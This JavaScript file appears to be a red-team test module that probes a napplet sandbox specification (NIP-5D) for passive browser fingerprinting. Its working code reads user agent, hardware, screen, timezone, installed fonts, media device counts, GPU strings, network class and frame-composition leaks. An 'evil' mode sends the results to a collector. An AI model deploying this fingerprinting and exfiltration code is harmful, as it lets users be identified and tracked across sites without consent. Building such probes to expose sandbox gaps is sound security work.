// evil-07 — fingerprinting & enumeration (tier 3). No CSP directive in
// NIP-5D's own baseline and no sandbox token covers passive device
// identification. This napplet collects and MASKS by default; in VERY EVIL
// mode it bundles and exfiltrates — the fingerprint IS the harm.
const FONT_LIST = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana', 'Menlo', 'Monaco', 'SF Pro Text', 'Segoe UI', 'Roboto', 'Ubuntu', 'Noto Sans', 'Cantarell', 'DejaVu Sans', 'Consolas'];

function probeFont(font) {
  const span = document.createElement('span');
  span.style.cssText = 'position:fixed;left:-9999px;top:0;font-size:32px;white-space:nowrap;';
  span.textContent = 'mmmmmmmmmmlli';
  document.body.appendChild(span);
  const base = (() => { span.style.fontFamily = 'monospace'; return span.getBoundingClientRect().width; })();
  span.style.fontFamily = '\'' + font + '\', monospace';
  const w = span.getBoundingClientRect().width;
  span.remove();
  return Math.abs(w - base) > 0.1;
}

const ATTACKS = [
  {
    id: 'core-id',
    name: 'platform & agent identity',
    target: 'navigator.userAgent / platform / languages',
    severity: 'high',
    harm: 'Browser build, OS, and language profile — the base identity layer for tracking a user across every napplet and site.',
    async demo() {
      const d = {
        ua: navigator.userAgent,
        platform: navigator.platform,
        languages: (navigator.languages || []).join(','),
      };
      return armed('UA/platform/language readable: ' + mask(d.ua, 24) + ' / ' + d.platform + ' / ' + d.languages + ' — identification base layer open');
    },
    async evil() {
      const out = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
      };
      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
        try {
          out.highEntropy = await navigator.userAgentData.getHighEntropyValues(['architecture', 'bitness', 'model', 'platformVersion', 'fullVersionList']);
        } catch (e) { out.highEntropyError = errMsg(e); }
      }
      out.exfil = await sendToCollector('core-id', out);
      return out;
    },
  },
  {
    id: 'hardware',
    name: 'hardware class',
    target: 'hardwareConcurrency / deviceMemory',
    severity: 'high',
    harm: 'CPU core count and RAM class — device identification strong enough to pick a single machine out of a fleet, and useful for calibrating side-channel timing attacks (see evil-08).',
    async demo() {
      const cores = navigator.hardwareConcurrency;
      const mem = navigator.deviceMemory;
      return armed('hardware readable: ' + cores + ' logical cores' + (mem ? ', ~' + mem + 'GB RAM class' : '') + ' — device-class identity, and timing-attack calibration data');
    },
    async evil() {
      const out = { hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory };
      out.exfil = await sendToCollector('hardware', out);
      return out;
    },
  },
  {
    id: 'display',
    name: 'display geometry',
    target: 'screen / viewport / pixel ratio',
    severity: 'high',
    harm: 'Physical screen size + DPI narrows a device to one model; window arrangement over time is a behavioral signature.',
    async demo() {
      const s = {
        w: screen.width, h: screen.height,
        aw: screen.availWidth, ah: screen.availHeight,
        depth: screen.colorDepth, dpr: window.devicePixelRatio,
        inner: window.innerWidth + 'x' + window.innerHeight,
      };
      return armed('display readable: ' + s.w + '×' + s.h + '@' + s.depth + ' (dpr ' + s.dpr + ', viewport ' + s.inner + ') — device-model narrowing');
    },
    async evil() {
      const out = {
        screen: { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth },
        devicePixelRatio: window.devicePixelRatio,
        viewport: { w: window.innerWidth, h: window.innerHeight },
      };
      out.exfil = await sendToCollector('display', out);
      return out;
    },
  },
  {
    id: 'locale-tz',
    name: 'locale & timezone',
    target: 'Intl.DateTimeFormat().resolvedOptions()',
    severity: 'medium',
    harm: 'Timezone + locale + calendar system — precise geographic and cultural profile of the user.',
    async demo() {
      const o = Intl.DateTimeFormat().resolvedOptions();
      return armed('locale/timezone readable: ' + o.timeZone + ' / ' + o.locale + ' — geographic profile open');
    },
    async evil() {
      const o = Intl.DateTimeFormat().resolvedOptions();
      const out = { timezone: o.timeZone, locale: o.locale, calendar: o.calendar, numbering: o.numberingSystem };
      out.exfil = await sendToCollector('locale-tz', out);
      return out;
    },
  },
  {
    id: 'fonts',
    name: 'font enumeration',
    target: 'style-src \'unsafe-inline\' — CSS is unrestricted',
    severity: 'high',
    harm: 'Installed font sets identify OS build, language packs, and design suites — a classic high-entropy fingerprint, fully reachable because the spec baseline allows inline styles.',
    async demo() {
      const present = FONT_LIST.filter(probeFont);
      return armed('font probe: ' + present.length + '/' + FONT_LIST.length + ' fonts distinguishable (' + present.slice(0, 5).join(', ') + '…) — high-entropy fingerprint surface open');
    },
    async evil() {
      const out = { fonts: FONT_LIST.filter(probeFont) };
      out.exfil = await sendToCollector('fonts', out);
      return out;
    },
  },
  {
    id: 'media-devices',
    name: 'media device enumeration',
    target: 'navigator.mediaDevices.enumerateDevices()',
    severity: 'critical',
    harm: 'Device COUNTS and kinds (cameras, microphones, speakers) — no permission needed, labels absent but shapes present. A camera-count fingerprint AND physical-surveillance recon for follow-on capture attacks.',
    async demo() {
      if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return blocked('enumerateDevices unavailable');
      try {
        const dev = await withTimeout(navigator.mediaDevices.enumerateDevices(), 2500);
        if (dev === 'timeout' || dev.__rejected) return blocked('enumerateDevices rejected: ' + (dev && dev.__rejected));
        const byKind = {};
        for (const d of dev) byKind[d.kind] = (byKind[d.kind] || 0) + 1;
        return armed('device inventory readable (labels masked): ' + Object.entries(byKind).map(([k, v]) => v + '×' + k).join(', ') + ' — hardware inventory of the user\'s room, no permission required');
      } catch (e) {
        return blocked(errMsg(e));
      }
    },
    async evil() {
      const out = {};
      try { out.devices = (await navigator.mediaDevices.enumerateDevices()).map((d) => ({ kind: d.kind })); } catch (e) { out.error = errMsg(e); }
      out.exfil = await sendToCollector('media-devices', out);
      return out;
    },
  },
  {
    id: 'gpu',
    name: 'GPU renderer strings',
    target: 'WebGL (no CSP directive applies)',
    severity: 'high',
    harm: 'GPU vendor/model via WEBGL_debug_renderer_info — machine-grade fingerprint, plus driver recon for follow-on GPU-based attacks.',
    async demo() {
      try {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        if (!gl) return blocked('WebGL unavailable — GPU fingerprint closed');
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        const r = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
        return armed('GPU renderer readable: ' + mask(r, 28) + ' — machine-grade fingerprint surface open');
      } catch (e) {
        return blocked(errMsg(e));
      }
    },
    async evil() {
      const out = {};
      try {
        const gl = document.createElement('canvas').getContext('webgl');
        const dbg = gl && gl.getExtension('WEBGL_debug_renderer_info');
        out.renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : (gl && gl.getParameter(gl.RENDERER));
        out.vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : (gl && gl.getParameter(gl.VENDOR));
      } catch (e) { out.error = errMsg(e); }
      out.exfil = await sendToCollector('gpu', out);
      return out;
    },
  },
  {
    id: 'network-class',
    name: 'network class',
    target: 'navigator.connection',
    severity: 'medium',
    harm: 'Effective connection type, downlink, RTT — ISP/geography hint plus load-state recon.',
    async demo() {
      const c = navigator.connection;
      if (!c) return na('navigator.connection unavailable (not exposed here)');
      return armed('network readable: ' + (c.effectiveType || '?') + (c.downlink ? ', ~' + c.downlink + 'Mb downlink' : '') + (c.rtt ? ', rtt ~' + c.rtt + 'ms' : '') + ' — connectivity class leaks');
    },
    async evil() {
      const c = navigator.connection;
      const out = c ? { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData } : { note: 'unavailable' };
      out.exfil = await sendToCollector('network', out);
      return out;
    },
  },
  {
    id: 'shell-composition',
    name: 'shell composition channel',
    target: 'parent.length / document.referrer / window.name',
    severity: 'high',
    harm: 'Cross-origin-legal reads NIP-5D never mentions: sibling napplet count, the shell URL (query tokens included), and a persistent cross-reload window.name channel — runtime recon and composition leak.',
    async demo() {
      const parts = [];
      const sibs = safeGet(() => window.parent.length - 1);
      parts.push(typeof sibs === 'number' ? sibs + ' sibling frame(s)' : String(sibs));
      if (document.referrer && document.referrer !== 'about:srcdoc') parts.push('referrer: ' + mask(document.referrer, 32));
      parts.push('window.name channel: ' + (window.name ? 'set (' + mask(window.name, 10) + ')' : 'empty, writable'));
      return armed('cross-origin-legal leaks readable: ' + parts.join(' · ') + ' — shell composition + URL leak with zero policy violation');
    },
    async evil() {
      const out = {
        parentLength: safeGet(() => window.parent.length),
        siblings: safeGet(() => window.parent.length - 1),
        referrer: document.referrer,
        windowName: window.name,
      };
      window.name = '__evil07_marker__';
      out.exfil = await sendToCollector('shell-composition', out);
      return out;
    },
  },
];